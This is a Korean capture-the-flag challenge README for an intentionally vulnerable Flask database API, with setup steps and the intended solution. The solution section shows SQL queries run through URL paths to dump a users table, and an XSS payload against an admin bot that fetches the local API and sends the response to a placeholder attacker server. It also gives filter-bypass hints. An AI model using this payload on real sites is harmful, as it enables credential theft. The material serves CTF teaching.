# Bot, bot
[나는야쓰레기](https://open.kakao.com/o/sHmLvQuc) 출제 (2020.9.6)
## 개요
> Flask를 처음 배운 쓰레기는 DB API를 만들었습니다. 여러분은 취약점을 찾으실 수 있으신가요?

## 설치
`git clone` 이후 문제 디렉터리로 들어와서 다음 작업을 시작해주세요:
1. virtualenv 설치 : `python3 -m venv ./virtualenv`
2. Chromedriver 설치 - 운영체제에 맞게 설치해 주세요. (Ubuntu server에 경우 [이 글](https://somjang.tistory.com/entry/Ubuntu-Ubuntu-%EC%84%9C%EB%B2%84%EC%97%90-Selenium-%EC%84%A4%EC%B9%98%ED%95%98%EA%B3%A0-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0)을 참고해 주세요)
3. 플래그 및 데이터베이스 설정 - 4개의 플래그, 4개의 데이터베이스가 있어야 합니다. /flag1.txt부터 /flag4.txt까지 플래그를 넣어주고, SQLite를 이용해서 /db/database1.db부터 /db/database4.db까지 스키마를 설정해 주세요. 
4. 자동실행을 위해서는 `run.sh`를 실행해 주세요.

## 의도한 풀이

출제의도: XSS및 SSRF

레벨 1은 API에 익숙해지기 위한 문제입니다. `/api`페이지로 들어가 사용법 예시를 보면, 경로를 이용해 SQL 쿼리를 실행시킬 수 있음을 알 수 있습니다. DB 전체 정보를 보기 위해 `/api/select/*/from/users`로 접속하면 전체 데이터베이스를 볼 수 있고, 관리자의 아이디와 비밀번호를 얻어 로그인하면 플래그를 얻을 수 있습니다.

레벨 2는 XSS를 통해 SSRF를 일으키는 문제입니다. `/error`에 메시지를 쓰면 관리자가 확인하는데(selenium 봇으로 구현했습니다), 이때 필터링이 없기 때문에 XSS가 발생합니다. 관리자는 *localhost*에서 작업중이기 때문에 API에 접근할 수 있고, 따라서 SSRF를 발생시킬 수 있습니다.

예시 코드는 다음과 같습니다:
```
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState === xhr.DONE) {
      document.location = '결과를 받을 서버 주소/?' + xhr.responseText;
  }
};
xhr.open('GET', 'http://127.0.0.1:10000/api/select/*/from/users');
xhr.send(); 
</script>
```

레벨 3과 4는 간단한 필터링 우회입니다. 
레벨 3의 SQL 필터는 `select * from users`를 `select id, password from users`로 고쳐서(다만 누가 admin인지 알 수 없기 때문에 모든 계정을 시도해봐야 합니다), 레벨 4의 XSS 필터는 `onload` 이벤트 핸들러 등을 사용해서 우회할 수 있습니다.
